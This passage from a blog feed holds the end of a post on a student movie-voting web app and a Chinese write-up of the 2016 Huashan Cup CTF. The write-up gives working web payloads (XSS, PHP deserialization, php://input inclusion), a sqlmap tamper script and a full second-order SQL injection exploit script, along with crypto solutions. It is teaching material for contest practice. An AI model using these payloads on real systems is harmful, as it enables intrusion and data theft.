class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，再次刷新时，如果投过<code>button</code>就成灰色，效果如图</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/8.png" alt=""></p><p>当然，另一舍友今天也问我，为什么不用<code>cookie</code>，<code>cookie</code>还可以设置过期时间呢，区别是什么?，见文解析<a href="http://jerryzou.com/posts/cookie-and-web-storage/" target="_blank" rel="noopener">详说 Cookie, LocalStorage 与 SessionStorage</a>。不过，我认为<code>cookie</code>也是可以的，<code>localStorage</code>是键值对，而<code>cookie</code>只是字符串，没有封装<code>cookie</code>方法时操作<code>cookie</code>就比较麻烦。</p><h4 id="前端自动化工具Gulp"><a href="#前端自动化工具Gulp" class="headerlink" title="前端自动化工具Gulp"></a>前端自动化工具Gulp</h4><p>本想试下<code>Webpack</code>，发现不好配，还是配下稍微熟悉点的<code>Gulp</code>，发现真是方便，自动编译<code>Less</code>，自动检查语法错误，自动压缩，自动浏览器刷新，前端开发神器。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/13.png" alt=""></p><h4 id="NodeJS图片异步上传"><a href="#NodeJS图片异步上传" class="headerlink" title="NodeJS图片异步上传"></a>NodeJS图片异步上传</h4><p>这一块原来用<code>Express</code>框架一直没上传过，这次看了<code>multer</code>官方原版文档 + 原来前端原生JS使用的<code>Formdata</code>对象，完美实现异步上传预览。 <strong>下次发博时写个详细的解决Express异步上传图片预览</strong>(因为现在用国内搜索引擎搜出来的基本都用不了，不是让你用jquery插件，就是让你npm install xxx模块，都不能很好的解决。)</p><h3 id="后台服务器"><a href="#后台服务器" class="headerlink" title="后台服务器"></a>后台服务器</h3><p>只负责提供<code>JSON</code>数据，基本架构<code>Springmvc+Spring+MyBatis</code>是我舍友写的。数据库采用 <code>Mysql</code>(本来打算用<code>Oracle</code>，不过实在是太重了，不易管理，所以换Mysql了)</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/7.png" alt=""></p><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><h6 id="1-首次和舍友采用前后分离的架构，没有文档驱动，接口就基本上通过-QQ-沟通。因为接口较少。"><a href="#1-首次和舍友采用前后分离的架构，没有文档驱动，接口就基本上通过-QQ-沟通。因为接口较少。" class="headerlink" title="1. 首次和舍友采用前后分离的架构，没有文档驱动，接口就基本上通过 QQ 沟通。因为接口较少。"></a>1. 首次和舍友采用<strong>前后分离</strong>的架构，没有文档驱动，接口就基本上通过 QQ 沟通。因为接口较少。</h6><h6 id="2-后台英文要稍微好点，不然-“statue”-1-和-“status”-1-是很容易写错了。-自我反省了好久，我有没有错，才发现不是我的错。"><a href="#2-后台英文要稍微好点，不然-“statue”-1-和-“status”-1-是很容易写错了。-自我反省了好久，我有没有错，才发现不是我的错。" class="headerlink" title="2. 后台英文要稍微好点，不然{“statue”:1}和{“status”:1}是很容易写错了。(自我反省了好久，我有没有错，才发现不是我的错。)"></a>2. 后台英文要稍微好点，不然<strong>{“statue”:1}</strong>和<strong>{“status”:1}</strong>是很容易写错了。(自我反省了好久，我有没有错，才发现不是我的错。)</h6><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/12.png" alt=""></p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/9.png" alt=""></p><h6 id="3-json问题，有时一粗心，就忘通过JSON-parse-jsonStr-将json字符串转成json对象了。"><a href="#3-json问题，有时一粗心，就忘通过JSON-parse-jsonStr-将json字符串转成json对象了。" class="headerlink" title="3. json问题，有时一粗心，就忘通过JSON.parse(jsonStr)将json字符串转成json对象了。"></a>3. <strong>json</strong>问题，有时一粗心，就忘通过<strong>JSON.parse(jsonStr)</strong>将<strong>json字符串</strong>转成<strong>json对象</strong>了。</h6><h6 id="4-前端完全分离的调试问题，舍友的电脑能连的Wifi我连不上，我能连的他连不上。然后就买了腾讯云的CentOS-7-Java服务器。"><a href="#4-前端完全分离的调试问题，舍友的电脑能连的Wifi我连不上，我能连的他连不上。然后就买了腾讯云的CentOS-7-Java服务器。" class="headerlink" title="4. 前端完全分离的调试问题，舍友的电脑能连的Wifi我连不上，我能连的他连不上。然后就买了腾讯云的CentOS 7 Java服务器。"></a>4. 前端完全分离的调试问题，舍友的电脑能连的Wifi我连不上，我能连的他连不上。然后就买了腾讯云的<code>CentOS 7</code> Java服务器。</h6><h6 id="5-舍友对Linux不是太了解，在大小写方面和目录权限问题上没处理好！"><a href="#5-舍友对Linux不是太了解，在大小写方面和目录权限问题上没处理好！" class="headerlink" title="5. 舍友对Linux不是太了解，在大小写方面和目录权限问题上没处理好！"></a>5. 舍友对<strong>Linux</strong>不是太了解，在<strong>大小写方面</strong>和<strong>目录权限</strong>问题上没处理好！</h6><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/14.png" alt=""></p><h6 id="6-后台对编码的处理没统一，先传过去的中文全是乱码，我一看数据库格式不是utf8-general-ci就明白了，结果还是乱码，舍友一看肯定是SpringMVC没有设置过滤器UTF-8格式，一加就OK了"><a href="#6-后台对编码的处理没统一，先传过去的中文全是乱码，我一看数据库格式不是utf8-general-ci就明白了，结果还是乱码，舍友一看肯定是SpringMVC没有设置过滤器UTF-8格式，一加就OK了" class="headerlink" title="6. 后台对编码的处理没统一，先传过去的中文全是乱码，我一看数据库格式不是utf8_general_ci就明白了，结果还是乱码，舍友一看肯定是SpringMVC没有设置过滤器UTF-8格式，一加就OK了"></a>6. 后台对编码的处理没统一，先传过去的中文全是乱码，我一看数据库格式不是<strong>utf8_general_ci</strong>就明白了，结果还是乱码，舍友一看肯定是<strong>SpringMVC</strong>没有设置过滤器<strong>UTF-8</strong>格式，一加就<strong>OK</strong>了</h6><h6 id="7-部署在云上时才发现的，因为用了Nginx服务器代理到了NodeJS，所以才开始获取到的用户ip全是127-0-0-1，最后Node要获取ip的话，只能通过X-Forwarded-For-的头-起初我个人觉得不太安全，不过一测试，结果不能伪造-。"><a href="#7-部署在云上时才发现的，因为用了Nginx服务器代理到了NodeJS，所以才开始获取到的用户ip全是127-0-0-1，最后Node要获取ip的话，只能通过X-Forwarded-For-的头-起初我个人觉得不太安全，不过一测试，结果不能伪造-。" class="headerlink" title="7. 部署在云上时才发现的，因为用了Nginx服务器代理到了NodeJS，所以才开始获取到的用户ip全是127.0.0.1，最后Node要获取ip的话，只能通过X-Forwarded-For 的头(起初我个人觉得不太安全，不过一测试，结果不能伪造)。"></a>7. 部署在云上时才发现的，因为用了<strong>Nginx</strong>服务器代理到了<strong>NodeJS</strong>，所以才开始获取到的用户ip全是<code>127.0.0.1</code>，最后<strong>Node</strong>要获取<code>ip</code>的话，只能通过<code>X-Forwarded-For</code> 的头<code>(起初我个人觉得不太安全，不过一测试，结果不能伪造)</code>。</h6><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/FFA456B0-26BE-45A6-A0B9-D8627275D7CA.png" alt=""></p><h6 id="8-正式投票时，发现投了6个左右，后台Java-Spring后台就挂掉了，显示的错误信息大概的意思是阻止请求信息，一查发现是没有配置连接数，所以就爆掉了，临时写了一个反馈的弹窗。最后改了之后，就能解决小量高并发了。"><a href="#8-正式投票时，发现投了6个左右，后台Java-Spring后台就挂掉了，显示的错误信息大概的意思是阻止请求信息，一查发现是没有配置连接数，所以就爆掉了，临时写了一个反馈的弹窗。最后改了之后，就能解决小量高并发了。" class="headerlink" title="8. 正式投票时，发现投了6个左右，后台Java Spring后台就挂掉了，显示的错误信息大概的意思是阻止请求信息，一查发现是没有配置连接数，所以就爆掉了，临时写了一个反馈的弹窗。最后改了之后，就能解决小量高并发了。"></a>8. 正式投票时，发现投了6个左右，后台<strong>Java Spring</strong>后台就挂掉了，显示的错误信息大概的意思是<strong>阻止请求信息</strong>，一查发现是没有配置连接数，所以就爆掉了，临时写了一个反馈的弹窗。最后改了之后，就能解决小量高并发了。</h6><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/D9AEEFE8-17CB-474A-829A-AD06D14B9424.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;电影投票系统&quot;&gt;&lt;a href=&quot;#电影投票系统&quot; class=&quot;headerlink&quot; title=&quot;电影投票系统&quot;&gt;&lt;/a&gt;电影投票系统&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Java课程设计，想试试前后端完全分离的开发(原来在Class+时曾体验过)，于是
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2016中国·西安“华山杯”WriteUp-SeeSea</title>
    <link href="https://www.ycjcl.cc/2018/07/08/2016%E4%B8%AD%E5%9B%BD%C2%B7%E8%A5%BF%E5%AE%89%E2%80%9C%E5%8D%8E%E5%B1%B1%E6%9D%AF%E2%80%9DWriteUp-%20SeeSea/"/>
    <id>https://www.ycjcl.cc/2018/07/08/2016中国·西安“华山杯”WriteUp- SeeSea/</id>
    <published>2018-07-07T17:15:23.000Z</published>
    <updated>2018-07-07T17:28:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>题目打包下载：<a href="">https://yunpan.cn/ckyrKxHJDPAIN</a> （提取码：bbaf）</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="1、签到-10"><a href="#1、签到-10" class="headerlink" title="1、签到(10)"></a>1、签到(10)</h3><blockquote><p>扫码回复 <code>hs_ctf</code>拿flag,  套路题。</p></blockquote><p><code>flag_Xd{hSh_ctf:WelcomeTo2016XiDian&amp;HumenHS}</code></p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/61851063.jpg" alt=""></p><h3 id="2、打不过-50"><a href="#2、打不过-50" class="headerlink" title="2、打不过~(50)"></a>2、打不过~(50)</h3><blockquote><p>打不过绕道走~ <a href="http://huashan.xdsec.cn/ctf_hs_00b.php" target="_blank" rel="noopener">http://huashan.xdsec.cn/ctf_hs_00b.php</a></p></blockquote><p>直接将submit按钮改成可点击，然后抓包，发现<code>str</code>值为<code>OGM0MzU1NTc3MTdhMTQ4NTc4ZmQ4MjJhYWVmOTYwNzk=</code>，拿出来解base64，然后再解一道md5，得到是<code>1931b</code>，然后提交<code>Password=1931b</code>，得flag:<code>flag_Xd{hSh_ctf:XD_aA@lvmM}</code></p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/93429080.jpg" alt=""></p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/35641631.jpg" alt=""></p><h3 id="3、系统管理-100"><a href="#3、系统管理-100" class="headerlink" title="3、系统管理(100)"></a>3、系统管理(100)</h3><blockquote><p><a href="http://huashan.xdsec.cn/xt" target="_blank" rel="noopener">http://huashan.xdsec.cn/xt</a>  账户:admin  密码:admin  请登陆<br>首次发包，返回部分源码，是<code>username</code>的md5值为0，所以令<code>username</code>值为<code>QNKCDZO</code>。</p></blockquote><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/25806101.jpg" alt=""></p><p>然后返回了<code>user.php</code>，然后对<code>user.php</code>进行发包。看到了新的源码，是一个反序列化漏洞。然后构造<code>password=a:2:{s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;}</code>，向<code>index.php</code>发包。得到flag:<code>flag_Xd{hSh_ctf:kidhvuensl^$}</code>。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/63995380.jpg" alt=""></p><p>###4、简单js(100)</p><blockquote><p>来道js前菜，热身一下吧~  <a href="http://huashan.xdsec.cn/jdjs" target="_blank" rel="noopener">http://huashan.xdsec.cn/jdjs</a></p></blockquote><p>进去后不能右键源码，其实各种查看源码的法子，例如火狐f12打开firebug，然后源码里就是简单的js而已</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:08:21%20" alt=""></p><p>在控制台里运行即可得到key值，submit得到flag。或者干脆直接onclick=”return check();”去掉</p><p>###5、弹弹弹！(150)</p><blockquote><p>弹出鱼尾纹！~  <a href="http://huashan.xdsec.cn/ctf_hs_00a.php" target="_blank" rel="noopener">http://huashan.xdsec.cn/ctf_hs_00a.php</a></p></blockquote><p>很简单的xss，过滤不严，<br><code>&lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt;</code></p><p>xss，直接构造payload<code>&lt;BODY%2BONLOAD%253Dalert%2528%2527XSS%2527%2529&gt;</code></p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/66687170.jpg" alt=""></p><p>###6、233(150)</p><blockquote><p>少年，老套路，你都懂得~  <a href="http://huashan.xdsec.cn/233/" target="_blank" rel="noopener">http://huashan.xdsec.cn/233/</a></p></blockquote><p>查看源代码 能看到是JSfuck编码 解码</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:11:22%20" alt=""></p><p>得到加密后的一句话木马<br><strong>┼攠數畣整爠煥敵瑳∨䁥祳ぴ㍧≴┩&gt;</strong><br>解密得到一句话密码<code>e@syt0g3t</code><br>得到 <code>flag_Xd{hSh_ctf:e@syt0g3t}</code></p><p>###7、无间道(200)</p><blockquote><p>无间道：放你的人来我这？~ <a href="http://huashan.xdsec.cn/upload/index.php" target="_blank" rel="noopener">http://huashan.xdsec.cn/upload/index.php</a></p></blockquote><p>利用“php很烦人”那题得到index.php源码，flag就在其中</p><p>正确解法：<br>一道上传截断题目,过程不多说。直接fuzz %80~%00中间的字符,即可上传成功,得到返回的flag。由于上传删除文件的过程有延时,可能存在竞争上传问题。</p><p>###8、Mory try<br>没做出来<br>看了师傅们的wp<br>过程大概是<br><strong>role参数里是两次base64编码，测试后可以注入。使用sqlmap的random user-agent绕过一下，并编写两次base64的tamper：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># Copyright (c) 7 team  All rights reserved</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> urlencode</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload)</span>:</span></span><br><span class="line">    retVal = payload</span><br><span class="line">    retVal = base64.b64encode(retVal)</span><br><span class="line">    retVal = base64.b64encode(retVal)</span><br><span class="line">    retVal = urllib.quote(retVal)</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><p>然后就能得到flag<br><code>flag_xd{hsh_ctf:sql_succeed!}</code></p><p>###9、php很烦人(200)</p><blockquote><p>但php仍然是世界上最好的语言   <a href="http://huashan.xdsec.cn/php/" target="_blank" rel="noopener">http://huashan.xdsec.cn/php/</a><br>发包，看到源码。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>是让传三个参数<code>user,file,pass</code>，然后先构造<code>user=php://input</code>,post值<code>the user is admin</code>。<code>file=class.php</code>，<code>pass=O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;}</code>反序列化去读取<code>f1a9.php</code>。直接出<code>flag</code>。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/78532530.jpg" alt=""></p><p>###10 、三秒钟记忆(300)</p><blockquote><p>三秒钟记忆</p></blockquote><p>最近只有三秒钟记忆，忘记的事情总是要一遍一遍的找回来…<br><a href="http://huashan.xdsec.cn/pic" target="_blank" rel="noopener">http://huashan.xdsec.cn/pic</a></p><p>这题也没做出来</p><p>也是看了师傅们的wp<br><strong><code>二次注入，触发点在密码找回那边。exp：</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment">#by mathias@xdsec</span></span><br><span class="line"><span class="comment"># Copyright (c) 7 team  All rights reserved</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">regist</span><span class="params">(usr)</span>:</span></span><br><span class="line">    flag=<span class="keyword">False</span></span><br><span class="line">    url=<span class="string">"http://huashan.*****.cn/pic/index.php?page=login"</span></span><br><span class="line">    payload=&#123;<span class="string">'name'</span>:usr,<span class="string">'pass'</span>:<span class="string">'123456'</span>,<span class="string">'email'</span>:<span class="string">'123456'</span>,<span class="string">'register'</span>:<span class="string">'%E6%B3%A8%E5%86%8C'</span>&#125;</span><br><span class="line">    r=requests.post(url,data=payload)</span><br><span class="line">    txt=r.text.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Duplicate'</span> <span class="keyword">in</span> txt <span class="keyword">or</span> len(txt)==<span class="number">503</span>:</span><br><span class="line">        flag=<span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset</span><span class="params">(usr)</span>:</span></span><br><span class="line">    flag=<span class="keyword">False</span></span><br><span class="line">    url=<span class="string">"http://huashan.*****.cn/pic/index.php?page=login"</span></span><br><span class="line">    payload=&#123;<span class="string">'name'</span>:usr,<span class="string">'reset'</span>:<span class="string">'%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81'</span>&#125;</span><br><span class="line">    r=requests.post(url,data=payload)</span><br><span class="line">    <span class="keyword">if</span> len(r.text)==<span class="number">460</span>:</span><br><span class="line">        flag=<span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    url=<span class="string">"http://huashan.*****.cn/pic/index.php?page=login"</span></span><br><span class="line">    flag=<span class="keyword">False</span></span><br><span class="line">    user=str(random.randint(<span class="number">10000000000</span>,<span class="number">99999999999</span>))</span><br><span class="line">    p=user+<span class="string">'\' and (select ascii(substr(flag,1,1)) from flag)&gt;50#'</span></span><br><span class="line">    flag=regist(user)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"regist "</span>+user+<span class="string">" error"</span></span><br><span class="line">        os._exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"regist "</span>+user+<span class="string">" success"</span></span><br><span class="line"></span><br><span class="line">    flag=regist(p)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"regist "</span>+p+<span class="string">" error"</span></span><br><span class="line">        os._exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"regist "</span>+p+<span class="string">" success,now reset password"</span></span><br><span class="line"></span><br><span class="line">    flag=reset(p)</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Reset success,now inject"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"reset "</span>+p+<span class="string">" error"</span></span><br><span class="line">        os._exit()</span><br><span class="line"></span><br><span class="line">    url=<span class="string">"http://huashan.*****.cn/pic/index.php?page=login"</span></span><br><span class="line">    payload=&#123;<span class="string">'name'</span>:user,<span class="string">'pass'</span>:<span class="string">'123456'</span>,<span class="string">'login'</span>:<span class="string">'%E7%99%BB%E5%BD%95'</span>&#125;</span><br><span class="line">    r=requests.post(url,data=payload)</span><br><span class="line">    <span class="keyword">if</span> len(r.text)==<span class="number">486</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"payload is wrong"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"payload is right"</span></span><br></pre></td></tr></table></figure><p>###11、疯狂的JS(300)</p><blockquote><p>疯狂的js，老师给我布置了一道js题，作为js小白的我做不到啊，大家帮忙看看吧~</p></blockquote><p>这个也是没做出来的<br><strong>题在出题过程中可能借鉴了</strong> <a href="https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/halphow2js" target="_blank" rel="noopener">这里</a><br>payload：<a href="http://js.xdsec.cn/myajax?a=2.0&amp;b=2.00&amp;c=2.000&amp;d=7&amp;e=762" target="_blank" rel="noopener">http://js.xdsec.cn/myajax?a=2.0&amp;b=2.00&amp;c=2.000&amp;d=7&amp;e=762</a></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>###1、紧急报文</p><blockquote><p>解密一下这份截获的密文吧，时间就是机会！<br>FA XX DD AG FF XG FD XG DD DG GA XF FA</p></blockquote><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:16:03%20" alt=""></p><p>###2、is it x or z ?</p><blockquote><p>is it x or z ?<br>100<br>你可以解密这些残损的文件吗？</p></blockquote><p>明文1和密文1异或得到key<br>密文2的key从最后个字母f开始循环<br>异或得到明文2</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:23:24%20" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment">#每个字节转成hex，0x顺便去掉，对于不足两位的补0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span><span class="params">(str)</span>:</span></span><br><span class="line">    hexs = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> str:</span><br><span class="line">        tmp = (hex(ord(s)).replace(<span class="string">'0x'</span>,<span class="string">''</span>))</span><br><span class="line">        <span class="keyword">if</span> len(tmp) == <span class="number">2</span>:</span><br><span class="line">            hexs.append(tmp)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hexs.append(<span class="string">'0'</span>+tmp)</span><br><span class="line">    <span class="keyword">return</span> hexs</span><br><span class="line"></span><br><span class="line">arr  = [<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>]</span><br><span class="line">arr2 = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tran</span><span class="params">(r)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):</span><br><span class="line">        <span class="keyword">if</span> r == arr[i]:</span><br><span class="line">            <span class="keyword">return</span> arr2[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'crypt-2.txt'</span>,<span class="string">'rb'</span>)</span><br><span class="line">f2 = open(<span class="string">'key.txt'</span>,<span class="string">'rb'</span>)</span><br><span class="line">hexs = []</span><br><span class="line">hexs2 = []</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    t = f.readline()</span><br><span class="line">    t2 = f2.readline()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> t <span class="keyword">or</span> <span class="keyword">not</span> t2:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    hexs.extend(str2hex(t))</span><br><span class="line">    hexs2.extend(str2hex(t2))</span><br><span class="line">f.close()</span><br><span class="line">f2.close()</span><br><span class="line"></span><br><span class="line">ff = open(<span class="string">'out.txt'</span>,<span class="string">'wb'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(min(len(hexs),len(hexs2))):</span><br><span class="line">    a = tran(hexs[i][<span class="number">0</span>])*<span class="number">16</span>+tran(hexs[i][<span class="number">1</span>])</span><br><span class="line">    b = tran(hexs2[i][<span class="number">0</span>])*<span class="number">16</span>+tran(hexs2[i][<span class="number">1</span>])</span><br><span class="line">    B = struct.pack(<span class="string">'B'</span>,a^b)</span><br><span class="line">    ff.write(B)</span><br><span class="line">ff.close()</span><br></pre></td></tr></table></figure><h3 id="3、分组加密检测-150"><a href="#3、分组加密检测-150" class="headerlink" title="3、分组加密检测(150)"></a>3、分组加密检测(150)</h3><blockquote><p>分组加密模式检测</p></blockquote><p>文件（challenge.txt）包含base64编码后的密文，其中某段密文采用的加密模式不太一样，请找出，并以该段密文base64解码后的前16个字符作为flag提交。</p><p>先全部base64解码 然后再去检测<br><a href="https://github.com/truongkma/ctf-tools/tree/master/cryptopals-solutions-master/set1/8" target="_blank" rel="noopener">Github</a>上面有项目 下载下来跑一下就是了</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:26:18%20" alt=""></p><h3 id="4、修复一下这份邀请函部分内容-200"><a href="#4、修复一下这份邀请函部分内容-200" class="headerlink" title="4、修复一下这份邀请函部分内容(200)"></a>4、修复一下这份邀请函部分内容(200)</h3><blockquote><p>修复一下这份邀请函的部分内容</p></blockquote><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:28:03%20" alt=""></p><p>红色部分就是flag 了</p><h3 id="5、时间决定一切-350"><a href="#5、时间决定一切-350" class="headerlink" title="5、时间决定一切(350)"></a>5、时间决定一切(350)</h3><blockquote><p>时间决定一切</p></blockquote><p>考验大家人品的时候到啦！！！<br><a href="http://huashan.xdsec.cn/mima/" target="_blank" 